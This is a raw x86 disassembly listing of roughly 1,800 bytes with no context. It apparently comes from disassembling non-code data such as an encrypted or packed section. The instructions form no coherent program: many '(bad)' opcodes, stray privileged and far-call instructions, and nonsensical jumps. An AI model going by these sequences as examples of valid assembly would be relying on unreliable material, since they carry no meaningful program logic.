  417aa8:	sub    DWORD PTR [esi],edi
  417aaa:	nop
  417aab:	aaa    
  417aac:	in     eax,0xd9
  417aae:	xchg   esi,eax
  417aaf:	pmulhuw mm6,QWORD PTR [ebx]
  417ab2:	mov    ebx,0xc2319933
  417ab7:	mov    al,0xf8
  417ab9:	push   ss
  417aba:	push   cs
  417abb:	inc    edx
  417abc:	mov    eax,ds:0x65c587f
  417ac1:	je     0x417b21
  417ac3:	mov    edx,0x6cc556a8
  417ac8:	fs push ebp
  417aca:	mov    ecx,0x5e7b6c39
  417acf:	fidiv  DWORD PTR [ebx]
  417ad1:	stc    
  417ad2:	lahf   
  417ad3:	repnz test al,0x66
  417ad6:	adc    ecx,DWORD PTR [ecx+0x4d]
  417ad9:	and    ecx,DWORD PTR ss:[eax-0x611e372e]
  417ae0:	and    dh,0xf4
  417ae3:	add    cl,BYTE PTR [edx+0x2d5b868a]
  417ae9:	fbstp  TBYTE PTR [ebx+edi*4-0x28]
  417aed:	lahf   
  417aee:	sub    BYTE PTR [ebp+0x72],cl
  417af1:	or     ch,BYTE PTR [edi-0x7b]
  417af4:	push   cs
  417af5:	in     al,0x81
  417af7:	add    BYTE PTR [edx],ch
  417af9:	push   0x541716b
  417afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b00:	out    0x9b,eax
  417b02:	adc    bl,bh
  417b04:	cmp    eax,0x6000bd8c
  417b09:	lods   eax,DWORD PTR ds:[esi]
  417b0a:	mov    bl,BYTE PTR [ebx+0x14]
  417b0d:	shl    BYTE PTR [edi+0x3],0x26
  417b11:	nop
  417b12:	mov    ecx,0xcf8adcb1
  417b17:	push   edi
  417b18:	pusha  
  417b19:	shl    DWORD PTR [ecx-0x5a7b5fb4],1
  417b1f:	stos   DWORD PTR es:[edi],eax
  417b20:	repz lea ebp,[eax+0x66]
  417b24:	cmp    ch,BYTE PTR [ebx-0x2e]
  417b27:	sahf   
  417b28:	xchg   edx,eax
  417b29:	js     0x417b76
  417b2b:	std    
  417b2c:	push   esi
  417b2d:	sbb    eax,0x2ca6022b
  417b32:	mov    bl,0x84
  417b34:	sub    al,0xbc
  417b36:	(bad)
  417b3a:	stos   BYTE PTR es:[edi],al
  417b3b:	(bad)  
  417b3c:	into   
  417b3d:	dec    ecx
  417b3e:	inc    edi
  417b3f:	es test al,0x1b
  417b42:	lods   al,BYTE PTR ds:[esi]
  417b43:	or     DWORD PTR [edi-0x5201d40a],0x190a0793
  417b4d:	mov    ebp,0x4603f310
  417b52:	int3   
  417b53:	dec    ecx
  417b54:	xchg   esp,eax
  417b55:	fiadd  DWORD PTR [esi+eax*8+0x7f9a956b]
  417b5c:	mov    cl,0xc3
  417b5e:	and    esi,DWORD PTR [esi+esi*1+0x19e06ebf]
  417b65:	mov    esp,DWORD PTR [ecx+0x7a]
  417b68:	mov    eax,0x92112224
  417b6d:	push   ss
  417b6e:	xor    al,0x98
  417b70:	pusha  
  417b71:	inc    eax
  417b72:	add    cl,BYTE PTR [eax+0x12]
  417b75:	mov    esp,0x39f780b8
  417b7a:	and    cl,BYTE PTR [ebp-0x43]
  417b7d:	inc    edi
  417b7e:	inc    edi
  417b7f:	push   ebp
  417b80:	bound  ecx,QWORD PTR [ecx]
  417b82:	dec    esi
  417b83:	pop    ebp
  417b84:	xor    DWORD PTR [ebx],esp
  417b86:	pop    esp
  417b87:	in     al,dx
  417b88:	sub    ebx,DWORD PTR ds:0x9a76e407
  417b8e:	xchg   ebx,eax
  417b8f:	mov    al,ds:0xb66b46ef
  417b94:	cmp    BYTE PTR [ecx-0x720c1cf3],bl
  417b9a:	and    bl,BYTE PTR [ebp+0x19]
  417b9d:	push   ebp
  417b9e:	rcr    DWORD PTR [eax-0x3d],1
  417ba1:	push   0x235501b8
  417ba6:	mov    esi,0xeda13c36
  417bab:	je     0x417c23
  417bad:	cmp    BYTE PTR [ebp+0x3f666df7],0xb3
  417bb4:	call   0x18ed7721
  417bb9:	sub    al,0x96
  417bbb:	call   0x98f7:0x251ed9fd
  417bc2:	jns    0x417b71
  417bc4:	fild   QWORD PTR [ecx]
  417bc6:	mov    eax,ds:0x9791ab67
  417bcb:	xor    eax,0x56cfa0ec
  417bd0:	mov    cl,0x8d
  417bd2:	mov    DWORD PTR [ecx],ebx
  417bd4:	pushf  
  417bd5:	ficomp WORD PTR [ebp+0x62]
  417bd8:	xor    al,0xd9
  417bda:	dec    esi
  417bdb:	cmp    bl,BYTE PTR [ebp-0x66c78cee]
  417be1:	cmp    eax,0xfdf33f1
  417be6:	xor    DWORD PTR [esi+0x2473d758],edx
  417bec:	mov    eax,es
  417bee:	clc    
  417bef:	jne    0x417b72
  417bf1:	pop    ebx
  417bf2:	retf   0x6e5d
  417bf5:	xor    DWORD PTR [edx+0x196be1a1],ecx
  417bfb:	adc    eax,0x4e462fef
  417c00:	popf   
  417c01:	push   ebx
  417c02:	jns    0x417bc4
  417c04:	or     bh,BYTE PTR [edi]
  417c06:	cmp    BYTE PTR [ebx+0x50d29926],0xe2
  417c0d:	pushf  
  417c0e:	inc    esi
  417c0f:	cld    
  417c10:	dec    ebx
  417c11:	cmc    
  417c12:	mov    bl,0xff
  417c14:	dec    esi
  417c15:	mov    BYTE PTR [ecx-0x1f],al
  417c18:	call   esi
  417c1a:	dec    esp
  417c1b:	dec    edi
  417c1c:	aam    0xc3
  417c1e:	in     al,dx
  417c1f:	popa   
  417c20:	pop    ecx
  417c21:	repz inc edi
  417c23:	mov    ch,0x9a
  417c25:	call   0xa335:0x26909bd0
  417c2c:	leave  
  417c2d:	dec    edi
  417c2e:	inc    edx
  417c2f:	test   al,0xb5
  417c31:	add    edi,DWORD PTR [edx-0x50]
  417c34:	pop    eax
  417c35:	jmp    0x417c8a
  417c37:	jmp    0x904a4014
  417c3c:	dec    ebp
  417c3d:	dec    ebp
  417c3e:	arpl   WORD PTR [ecx-0x2a],sp
  417c41:	inc    eax
  417c42:	adc    ch,BYTE PTR [esi+eiz*2]
  417c45:	sub    edi,DWORD PTR [ecx+0x4023608c]
  417c4b:	fisttp WORD PTR [ecx-0x7ce81eaf]
  417c51:	and    esi,DWORD PTR [ecx+0x74]
  417c54:	xor    BYTE PTR [ebx-0x387919bb],ah
  417c5a:	into   
  417c5b:	sub    DWORD PTR [esi],esp
  417c5d:	mov    BYTE PTR ds:[eax],cl
  417c60:	xor    cl,ch
  417c62:	fistp  QWORD PTR [ecx]
  417c64:	jmp    0x219b:0x4b8bc7cf
  417c6b:	call   0x4a70:0xca49aaf8
  417c72:	sub    al,0x38
  417c74:	test   DWORD PTR [esi],eax
  417c76:	cmp    eax,0x1c8f2e69
  417c7b:	mov    ebx,DWORD PTR [eax+0x7]
  417c7e:	mov    eax,esi
  417c80:	pop    esi
  417c81:	fs enter 0x9aaf,0x31
  417c86:	jp     0x417c09
  417c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c89:	sbb    al,0x7c
  417c8b:	xchg   esi,eax
  417c8c:	cmp    eax,0x168959d2
  417c91:	jp     0x417cb5
  417c93:	sbb    ah,BYTE PTR [edi-0x25]
  417c96:	loope  0x417ce1
  417c98:	xor    BYTE PTR [esi],bh
  417c9a:	(bad)  
  417c9b:	jo     0x417c86
  417c9d:	cwde   
  417c9e:	psrlw  mm5,QWORD PTR [eax]
  417ca1:	mov    ecx,0x114261bd
  417ca6:	rol    BYTE PTR [eax+0x666049b6],cl
  417cac:	sbb    edi,ecx
  417cae:	mov    dh,BYTE PTR [ecx+0x55300484]
  417cb4:	jp     0x417c43
  417cb6:	fs cmp al,0x97
  417cb9:	out    0x59,al
  417cbb:	dec    ecx
  417cbc:	cdq    
  417cbd:	enter  0xd309,0x9e
  417cc1:	call   0x237dd394
  417cc6:	(bad)  
  417cc7:	fcom   QWORD PTR [esi+0x1d]
  417cca:	(bad)  
  417ccb:	mov    ebx,0xe9d9b79a
  417cd0:	enter  0x46dd,0xe8
  417cd4:	xor    DWORD PTR [ebp+0x4f9d028b],0xffffff85
  417cdb:	mov    edx,esp
  417cdd:	ror    BYTE PTR [ecx-0x37],1
  417ce0:	xor    al,0xcc
  417ce2:	xchg   edx,eax
  417ce3:	sbb    eax,0xf9991d74
  417ce8:	mov    ah,0xd3
  417cea:	xchg   DWORD PTR [ebx],edi
  417cec:	jb     0x417d38
  417cee:	loope  0x417c77
  417cf0:	dec    ebx
  417cf1:	push   cs
  417cf2:	js     0x417c76
  417cf4:	(bad)  
  417cf5:	sbb    BYTE PTR [eax],cl
  417cf7:	xchg   BYTE PTR [edi],dl
  417cf9:	mov    bh,0x77
  417cfb:	mov    DWORD PTR [ebx+0x9],ecx
  417cfe:	dec    edi
  417cff:	sub    ebp,DWORD PTR [esi+0x89cd214]
  417d05:	ret    
  417d06:	out    0xb7,al
  417d08:	mov    bh,0xbc
  417d0a:	not    DWORD PTR [eax+0x7b]
  417d0d:	sbb    BYTE PTR [ebx],cl
  417d0f:	pop    ss
  417d10:	hlt    
  417d11:	push   edx
  417d12:	out    0xb,eax
  417d14:	(bad)  
  417d15:	rcl    DWORD PTR [edi+0x307540ca],1
  417d1b:	jo     0x417d05
  417d1d:	push   es
  417d1e:	ret    0xc7aa
  417d21:	push   ss
  417d22:	mov    ebx,eax
  417d24:	mov    esp,DWORD PTR [esi-0x60]
  417d27:	shr    DWORD PTR [eax-0x6d],cl
  417d2a:	mov    edi,0xbe91332b
  417d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d30:	test   DWORD PTR [edx-0x5440bf14],esp
  417d36:	mov    ah,0x72
  417d38:	or     ch,BYTE PTR [ecx+ebx*4+0x3a]
  417d3c:	jmp    0x821d:0xf8bf6dc0
  417d43:	inc    edx
  417d44:	pop    edx
  417d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d46:	mov    ds:0x8d361a6b,eax
  417d4b:	loop   0x417d54
  417d4d:	(bad)  
  417d4e:	xchg   edi,eax
  417d4f:	or     eax,0x18a9e588
  417d54:	cdq    
  417d55:	out    dx,al
  417d56:	or     ebp,ebp
  417d58:	outs   dx,DWORD PTR ds:[esi]
  417d59:	adc    eax,0x5c43cf4
  417d5e:	sub    ebx,DWORD PTR [ebx]
  417d60:	stos   BYTE PTR es:[edi],al
  417d61:	jmp    0x417dbd
  417d63:	xor    DWORD PTR [eax+0xa62015a],esp
  417d69:	int3   
  417d6a:	xor    bl,BYTE PTR [edx-0x3757312a]
  417d70:	xor    ebx,DWORD PTR [ebx]
  417d72:	loop   0x417da2
  417d74:	mov    fs,WORD PTR [ecx*4-0x1c264041]
  417d7b:	(bad)  
  417d7c:	std    
  417d7d:	test   DWORD PTR [edi+0x34be518e],edi
  417d83:	call   0x2c8baac9
  417d88:	ret    0x23d4
  417d8b:	sar    BYTE PTR [edi+0x6a],cl
  417d8e:	push   DWORD PTR [esi-0x1e]
  417d91:	ja     0x417d33
  417d93:	cmp    DWORD PTR [eax+0x3d8a30c5],0xf57c149
  417d9d:	pop    esi
  417d9e:	mov    ah,0x71
  417da0:	dec    edx
  417da1:	dec    edi
  417da2:	sub    edx,edx
  417da4:	inc    BYTE PTR [ebx+eiz*4]
  417da7:	dec    ecx
  417da8:	cmp    bh,dh
  417daa:	and    cl,dh
  417dac:	pusha  
  417dad:	jb     0x417dfd
  417daf:	(bad)  
  417db0:	rcl    DWORD PTR [ecx-0x6e4e6b9],1
  417db6:	jge    0x417d4a
  417db8:	jns    0x417dee
  417dba:	outs   dx,BYTE PTR ds:[esi]
  417dbb:	data16 jbe 0x417dc2
  417dbe:	inc    ebp
  417dbf:	in     al,dx
  417dc0:	mov    ebp,0x879a6d2
  417dc5:	push   0x59
  417dc7:	data16 sub BYTE PTR [ebp-0x2570a808],bl
  417dce:	and    al,0xd4
  417dd0:	sbb    BYTE PTR [ebx+0x66],0x2d
  417dd4:	fwait
  417dd5:	mov    ds:0x5d03a479,al
  417dda:	sub    eax,0x8c9453f0
  417ddf:	popa   
  417de0:	cli    
  417de1:	dec    ebp
  417de2:	pop    ebx
  417de3:	push   0x57
  417de5:	(bad)  
  417de6:	fnsave [eax-0x2f]
  417de9:	shr    ch,cl
  417deb:	sub    BYTE PTR [ebx+0x76d914b7],bh
  417df1:	addr16 into 
  417df3:	mov    eax,ds:0x7df69078
  417df8:	(bad)  
  417df9:	cmp    si,bx
  417dfc:	cs dec edx
  417dfe:	dec    edx
  417dff:	movaps XMMWORD PTR [edx-0x44],xmm4
  417e03:	test   al,0x9f
  417e05:	not    bl
  417e07:	adc    eax,0xbc8501bb
  417e0c:	rcr    DWORD PTR [edi],1
  417e0e:	loop   0x417e27
  417e10:	cwde   
  417e11:	popa   
  417e12:	jnp    0x417e1e
  417e14:	mov    edx,0x1f0f7274
  417e19:	mov    WORD PTR [ecx-0x45b4ae23],ss
  417e1f:	push   ebp
  417e20:	inc    BYTE PTR [ebx]
  417e22:	(bad)
  417e26:	into   
  417e27:	cdq    
  417e28:	(bad)  
  417e29:	cld    
  417e2a:	cli    
  417e2b:	push   es
  417e2c:	rcl    BYTE PTR [eax],0x75
  417e2f:	or     DWORD PTR [eax+eiz*2+0x23],ebx
  417e33:	pop    ss
  417e34:	leave  
  417e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e36:	mov    eax,ds:0xd516fa82
  417e3b:	push   ebx
  417e3c:	push   edx
  417e3d:	mov    bh,0x93
  417e3f:	or     al,0x4d
  417e41:	repz repz fcmovne st,st(7)
  417e45:	inc    esi
  417e46:	add    BYTE PTR [eax+0x3dbac66d],0x2f
  417e4d:	add    bl,BYTE PTR [esi+0x6f]
  417e50:	inc    eax
  417e51:	mov    esi,DWORD PTR [edi+0x16]
  417e54:	xchg   cl,bl
  417e56:	or     DWORD PTR [ecx-0x68c6d104],ecx
  417e5c:	push   cs
  417e5d:	rcl    DWORD PTR [eax-0x5e7df5ad],1
  417e63:	clc    
  417e64:	aam    0x9d
  417e66:	mov    ds:0x4294a4fd,eax
  417e6b:	xor    eax,0xe1de292e
  417e70:	loop   0x417e4b
  417e72:	fsub   st(0),st
  417e74:	int3   
  417e75:	jecxz  0x417eca
  417e77:	inc    ecx
  417e78:	hlt    
  417e79:	std    
  417e7a:	and    BYTE PTR [ecx+ecx*2],ch
  417e7d:	xchg   esp,eax
  417e7e:	mov    gs,esp
  417e80:	iret   
  417e81:	mov    ecx,0x8c905fc7
  417e86:	or     ecx,DWORD PTR [ecx-0x3f3cad17]
  417e8c:	in     eax,0xef
  417e8e:	sbb    bh,ch
  417e90:	mov    esp,0xc185d652
  417e95:	cmp    DWORD PTR es:[eax-0x64],edx
  417e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e9a:	mov    ch,0xbb
  417e9c:	adc    eax,ecx
  417e9e:	pop    ecx
  417e9f:	mov    esp,0xfe1602f7
  417ea4:	fidiv  WORD PTR [edi-0x36]
  417ea7:	adc    DWORD PTR [edi-0x62],edx
  417eaa:	cdq    
  417eab:	fidivr DWORD PTR [eax-0x29c4a88f]
  417eb1:	test   al,0xb7
  417eb3:	pop    ecx
  417eb4:	push   edx
  417eb5:	add    al,0xed
  417eb7:	xchg   BYTE PTR [ecx],ah
  417eb9:	mov    bl,BYTE PTR [eax]
  417ebb:	cld    
  417ebc:	add    al,0xd5
  417ebe:	pop    ds
  417ebf:	mov    esi,0x880bf9f6
  417ec4:	rcl    DWORD PTR [esi],1
  417ec6:	sbb    cl,BYTE PTR [esi+0x5e]
  417ec9:	jmp    0x89c7:0x21b60090
  417ed0:	and    esi,DWORD PTR [esi+0x27]
  417ed3:	push   0xffffffef
  417ed5:	lahf   
  417ed6:	rcr    DWORD PTR [ebp+0x2e],0xa7
  417eda:	aad    0x44
  417edc:	lock pop edi
  417ede:	adc    bh,dh
  417ee0:	(bad)  
  417ee1:	sub    al,0x83
  417ee3:	dec    ecx
  417ee4:	push   ecx
  417ee5:	or     DWORD PTR [ebp-0x362c4d2b],ebp
  417eeb:	iret   
  417eec:	ins    BYTE PTR es:[edi],dx
  417eed:	sahf   
  417eee:	adc    bh,BYTE PTR [edx]
  417ef0:	jl     0x417ed6
  417ef2:	inc    ebx
  417ef3:	xlat   BYTE PTR ds:[ebx]
  417ef4:	jl     0x417ee9
  417ef6:	or     eax,0xf6e73ac3
  417efb:	xchg   edi,eax
  417efc:	retf   
  417efd:	pop    es
  417efe:	sub    ah,bh
  417f00:	fcmovnbe st,st(5)
  417f02:	fild   WORD PTR [ecx-0x118e188]
  417f08:	lds    eax,FWORD PTR [ebx]
  417f0a:	mov    dl,cl
  417f0c:	ds ret 0xc028
  417f10:	ja     0x417edc
  417f12:	aam    0x0
  417f14:	mov    edx,0x185be059
  417f19:	retf   
  417f1a:	mov    edx,0xd806a3e4
  417f1f:	lods   al,BYTE PTR ds:[esi]
  417f20:	mov    ah,0xc6
  417f22:	mov    esi,0xe0fa3f33
  417f27:	dec    esi
  417f28:	dec    ebp
  417f29:	cdq    
  417f2a:	test   BYTE PTR [ebp+eax*2+0x4e],cl
  417f2e:	and    eax,0xd788f072
  417f33:	pushf  
  417f34:	xchg   esp,eax
  417f35:	cs retf 0x7df8
  417f39:	std    
  417f3a:	push   0x52
  417f3c:	sbb    BYTE PTR [esi+0xb3bcc5c],al
  417f42:	out    0x2,al
  417f44:	xor    BYTE PTR [ebx],al
  417f46:	in     al,0x64
  417f48:	push   ds
  417f49:	(bad)  
  417f4a:	push   edx
  417f4b:	cld    
  417f4c:	loope  0x417f33
  417f4e:	adc    eax,0xb7667728
  417f53:	jae    0x417fad
  417f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f56:	mov    dh,BYTE PTR [eax]
  417f58:	mov    ds:0x108aeac9,al
  417f5d:	idiv   DWORD PTR [edi-0x2b366922]
  417f63:	cmp    al,0x7e
  417f65:	xchg   BYTE PTR [edi-0x65a8aa8e],dh
  417f6b:	add    al,0x53
  417f6d:	shr    BYTE PTR [edi+0x47],0xac
  417f71:	js     0x417f66
  417f73:	jns    0x417fd0
  417f75:	jns    0x417efa
  417f77:	iret   
  417f78:	loop   0x417f90
  417f7a:	push   ebp
  417f7b:	inc    ecx
  417f7c:	push   ebp
  417f7d:	pop    edx
  417f7e:	repz mov ebx,DWORD PTR [esi+ecx*8+0x73b55f47]
  417f86:	mov    ebx,0xe088ae37
  417f8b:	jnp    0x417ff2
  417f8d:	mov    al,ds:0x98e18d94
  417f92:	test   edi,esi
  417f94:	fmul   DWORD PTR [ecx-0x45]
  417f97:	imul   edx,edi,0x69bde715
  417f9d:	fist   WORD PTR [ecx-0x23]
  417fa0:	cs pop es
  417fa2:	outs   dx,BYTE PTR ds:[esi]
  417fa3:	outs   dx,DWORD PTR ds:[esi]
  417fa4:	or     ah,BYTE PTR [esi-0x2fff764b]
  417faa:	or     BYTE PTR ds:0xe0f4f27e,bl
  417fb0:	mov    esi,0x996595cc
  417fb5:	sbb    bh,ch
  417fb7:	outs   dx,BYTE PTR ds:[esi]
  417fb8:	mov    cr1,edx
  417fbb:	xor    eax,0x218cc4cf
  417fc0:	mov    esi,gs
  417fc2:	(bad)  
  417fc3:	xor    DWORD PTR [edx],ecx
  417fc5:	dec    edi
  417fc6:	icebp  
  417fc7:	jae    0x418013
  417fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fca:	add    edi,esp
  417fcc:	call   0xf01a:0xf519ced3
  417fd3:	(bad)  
  417fd4:	mov    ah,0x2a
  417fd6:	popf   
  417fd7:	imul   ebp,DWORD PTR [edi],0x5
  417fda:	jg     0x417f7e
  417fdc:	int3   
  417fdd:	or     eax,0x394b4b81
  417fe2:	fisttp QWORD PTR gs:[ebx+edx*4-0x66]
  417fe7:	rcl    esp,0x33
  417fea:	jle    0x417fe5
  417fec:	mov    ecx,ebx
  417fee:	push   eax
  417fef:	dec    eax
  417ff0:	cwde   
  417ff1:	inc    ebp
  417ff2:	cmp    BYTE PTR [edx],0x3c
  417ff5:	arpl   WORD PTR [edx],bp
  417ff7:	jbe    0x417f93
  417ff9:	test   eax,0x5ae464bc
  417ffe:	into   
  417fff:	inc    eax
  418000:	jmp    0x4d5e:0x51303789
  418007:	test   eax,0xdeb84260
  41800c:	lock inc eax
  41800e:	jno    0x417fa7
  418010:	push   esi
  418011:	or     al,0xdc
  418013:	push   0x4e
  418015:	xor    BYTE PTR [ebp-0x4db833f8],ah
  41801b:	ins    DWORD PTR es:[edi],dx
  41801c:	jge    0x417ff0
  41801e:	xor    eax,DWORD PTR ds:0x51fc6051
  418024:	(bad)  
  418025:	loopne 0x417fdc
  418027:	f2xm1  
  418029:	cs mov ah,0xaa
  41802c:	xchg   ebp,eax
  41802d:	ja     0x417fc2
  41802f:	mov    DWORD PTR [edx],esi
  418031:	and    al,BYTE PTR [edx+edx*4+0x5f74af35]
  418038:	dec    esp
  418039:	loope  0x41804a
  41803b:	add    al,0xa
  41803d:	repz sbb BYTE PTR [edi-0x56],bl
  418041:	push   cs
  418042:	std    
  418043:	dec    ebx
  418044:	mov    bh,0x72
  418046:	dec    esp
  418047:	cli    
  418048:	add    ebp,DWORD PTR [ebp-0xd4f1404]
  41804e:	cmp    ch,BYTE PTR [ebp+0x6f]
  418051:	pop    esi
  418052:	push   eax
  418053:	shr    DWORD PTR [ecx+ebp*4-0x26],0x5e
  418058:	xchg   ebp,eax
  418059:	dec    eax
  41805a:	mov    eax,ds:0xead506e0
  41805f:	xor    dl,BYTE PTR [edi]
  418061:	push   esi
  418062:	test   dh,bl
  418064:	mov    ebx,0xd18624de
  418069:	push   cs
  41806a:	or     bl,BYTE PTR [edi]
  41806c:	sub    edx,edi
  41806e:	xchg   edx,eax
  41806f:	jmp    0x2cd1:0x455ea652
  418076:	(bad)  
  418077:	je     0x4180b8
  418079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41807a:	sbb    eax,0x651760a
  41807f:	sti    
  418080:	cld    
  418081:	mov    edi,0xe86d3532
  418086:	add    eax,0xa90759f6
  41808b:	cmp    edi,DWORD PTR [ebx-0x62]
  41808e:	pop    ebx
  41808f:	hlt    
  418090:	mov    ds:0xc0b7494a,eax
  418095:	ficomp WORD PTR [esi-0x433b2c02]
  41809b:	bnd jle 0x41802d
  41809e:	jmp    0x9a78a9f7
  4180a3:	(bad)  
  4180a4:	out    dx,al
  4180a5:	fcomi  st,st(1)
  4180a7:	add    eax,edx
  4180a9:	cmp    ecx,edx
  4180ab:	sub    BYTE PTR [edx-0x8944c3d],ch
  4180b1:	std    
  4180b2:	cmp    eax,0x18d21a48
  4180b7:	mov    ds:0x4f86f39e,eax
  4180bc:	pusha  
  4180bd:	xchg   ebp,eax
  4180be:	hlt    
  4180bf:	add    ebx,esp
  4180c1:	jecxz  0x418043
  4180c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180c4:	mov    esi,0xc1b2271
  4180c9:	inc    ecx
  4180ca:	and    esp,DWORD PTR ss:[esi+0x4ca8fa9]
  4180d1:	pop    ss
  4180d2:	xor    ch,cl
  4180d4:	adc    al,0x10
  4180d6:	jmp    0xf6634f2a
  4180db:	iret   
  4180dc:	xchg   esi,eax
  4180dd:	loope  0x418153
  4180df:	push   esp
  4180e0:	out    dx,al
  4180e1:	inc    edi
  4180e2:	ins    BYTE PTR es:[edi],dx
  4180e3:	sti    
  4180e4:	add    al,BYTE PTR [ecx-0x4730086e]
  4180ea:	stos   BYTE PTR es:[edi],al
  4180eb:	sub    dh,BYTE PTR [ecx-0x12]
  4180ee:	mov    eax,ds:0x17c7049f
  4180f3:	dec    ebp
  4180f4:	dec    edi
  4180f5:	or     ebp,ebp
  4180f7:	out    dx,eax
  4180f8:	push   esi
  4180f9:	call   0x3aa4:0x14a563c4
  418100:	ror    ebx,1
  418102:	push   ss
  418103:	pop    esi
  418104:	icebp  
  418105:	xchg   DWORD PTR [ecx+0x75],edx
  418108:	inc    ebx
  418109:	popf   
  41810a:	add    eax,0xd3572b5f
  41810f:	imul   eax,DWORD PTR [edi-0x2055b7fd],0xffffff8a
  418116:	(bad)  
  418117:	push   ss
  418118:	jg     0x418172
  41811a:	pop    ss
  41811b:	mov    al,ds:0xfa904c71
  418120:	cdq    
  418121:	push   ds
  418122:	or     esp,DWORD PTR [esi]
  418124:	(bad)  
  418125:	sub    BYTE PTR ds:0xaa2545c,al
  41812b:	psllw  mm5,QWORD PTR [ebx+ecx*8]
  41812f:	sbb    BYTE PTR [ebp-0x213e40f2],dh
  418135:	js     0x41818a
  418137:	inc    ebx
  418138:	aas    
  418139:	sbb    eax,0x5467ffb3
  41813e:	or     eax,0x58ba162e
  418143:	repnz and al,0xa8
  418146:	cli    
  418147:	clc    
  418148:	mov    esi,0x1fbc21bb
  41814d:	scas   eax,DWORD PTR es:[edi]
  41814e:	sub    esi,esi
  418150:	mov    eax,ds:0x84ee0477
  418155:	push   edx
  418156:	pop    esp
  418157:	fnsave [ebp-0x72]
  41815a:	call   0xf345:0xc581d576
  418161:	jo     0x418134
  418163:	dec    ebx
  418164:	retf   0xbad1
  418167:	pop    eax
  418168:	pop    ss
  418169:	aas    
  41816a:	mov    ds:0x5a1499ad,al
  41816f:	outs   dx,DWORD PTR ds:[esi]
  418170:	jo     0x41811d
  418172:	sub    BYTE PTR [ebp-0x2af53a68],bh
  418178:	jns    0x4181e9
  41817a:	jle    0x4181ce
  41817c:	pop    ds
  41817d:	bound  ebp,QWORD PTR [ecx+0x6b836838]
  418183:	in     eax,0x4d
  418185:	jns    0x4181b5
  418187:	stos   BYTE PTR es:[edi],al
  418188:	out    0xdb,al
  41818a:	xor    edi,ebx
  41818c:	sub    BYTE PTR [ebx],0xdb
  41818f:	jbe    0x4181af
  418191:	cmc    
  418192:	sub    eax,0xc3552dd1
  418197:	mov    ds:0x374a6291,al
  41819c:	and    BYTE PTR [ecx+edx*2-0x5e6fc082],0xd4
  4181a4:	ja     0x4181bd
  4181a6:	add    al,0x1a
  4181a8:	mov    WORD PTR [ecx+edi*1-0x7e612fbe],fs
  4181af:	mov    bh,0xa5
  4181b1:	pop    esp
  4181b2:	mov    edx,0xa15689a4
  4181b7:	out    dx,eax
  4181b8:	dec    ecx
  4181b9:	lahf   
  4181ba:	inc    edx
  4181bb:	sbb    eax,DWORD PTR [eax+eax*1+0x0]
  4181bf:	xlat   BYTE PTR ds:[ebx]
  4181c0:	ds mov edi,0x696a187
  4181c6:	and    dl,ah
  4181c8:	jno    0x41819c
  4181ca:	sub    al,0xba
  4181cc:	daa    
  4181cd:	xchg   ebx,eax
  4181ce:	sub    BYTE PTR [esp+edi*1+0x2c971640],dh
  4181d5:	fstp   DWORD PTR [edi-0x73]
  4181d8:	lods   al,BYTE PTR ds:[esi]
  4181d9:	cld    
  4181da:	imul   ebx,DWORD PTR [eax+0x21],0x7abb29d1
  4181e1:	push   ebp
  4181e2:	pushf  
  4181e3:	push   cs
  4181e4:	dec    ebx
  4181e5:	mov    al,ds:0xd0bd093
  4181ea:	mov    ah,0x18
  4181ec:	outs   dx,BYTE PTR ds:[esi]
  4181ed:	data16 icebp 
  4181ef:	popf   
  4181f0:	inc    esi
  4181f1:	data16 loope 0x4181d8
  4181f4:	mov    dh,0xe3
  4181f6:	dec    edx
  4181f7:	into   
  4181f8:	jp     0x418237
  4181fa:	ret    0xeb4a
  4181fd:	dec    esp
  4181fe:	pop    esp
  4181ff:	inc    ecx
  418200:	hlt    
  418201:	nop
  418202:	lea    eax,[esi-0xf2096b1]
  418208:	dec    ebp
  418209:	dec    ecx
  41820a:	enter  0xc667,0x45
  41820e:	and    al,0x42
  418210:	xchg   ecx,eax
  418211:	aas    
  418212:	push   edi
  418213:	pop    esi
  418214:	mov    esp,0x84c07ba1
  418219:	push   ds
  41821a:	fadd   DWORD PTR [ebp+0x7f]
  41821d:	out    dx,eax
  41821e:	mov    edi,0xa4794e72
  418223:	cs mov esi,0xa1692899
  418229:	fmul   DWORD PTR [edi-0x2b]
  41822c:	cdq    
  41822d:	push   esp
  41822e:	jmp    0x52ab8baa
  418233:	and    al,0x33
  418235:	sar    DWORD PTR [esi-0x42],0x66
  418239:	adc    BYTE PTR [edx-0x35d9158e],ah
  41823f:	lea    esi,[edx]
  418241:	test   al,0x29
  418243:	ins    BYTE PTR es:[edi],dx
  418244:	mov    ecx,0x79c998dd
  418249:	dec    esp
  41824a:	add    eax,0x6853ad46
  41824f:	cmp    ebx,DWORD PTR [edi+0x31]
  418252:	and    al,0x32
  418254:	fsubp  st(6),st
  418256:	inc    esp
  418257:	loopne 0x418213
  418259:	mov    edx,0xe540b24d
  41825e:	jae    0x41828e
  418260:	das    
  418261:	out    0xf5,al
  418263:	pop    eax
  418264:	aad    0x32
  418266:	jne    0x418268
  418268:	cmp    ecx,DWORD PTR [edx-0x78afe84e]
  41826e:	call   0xf816:0xb642d113
  418275:	imul   edx,DWORD PTR [edi+0x22d7b1a2],0xffffffb3
  41827c:	mov    esp,0x8b486316
  418281:	xchg   ebx,eax
  418282:	pop    ebp
  418283:	int3   
  418284:	rcl    BYTE PTR [ecx+0x77],1
  418287:	pop    esi
  418288:	imul   edi,DWORD PTR [eax],0x11
  41828b:	aam    0x14
  41828d:	add    DWORD PTR [ebp-0x36],edi
  418290:	fsubr  QWORD PTR [edx-0x51]
  418293:	nop
  418294:	mov    WORD PTR [edi],cs
  418296:	inc    ecx
  418297:	push   ebp
  418298:	out    0xf2,eax
  41829a:	arpl   WORD PTR [edx],di
  41829c:	adc    al,0xf1
  41829e:	mov    edx,0x90bbfba4
  4182a3:	xchg   ebx,eax
  4182a4:	jg     0x4182ff
  4182a6:	ins    BYTE PTR es:[edi],dx
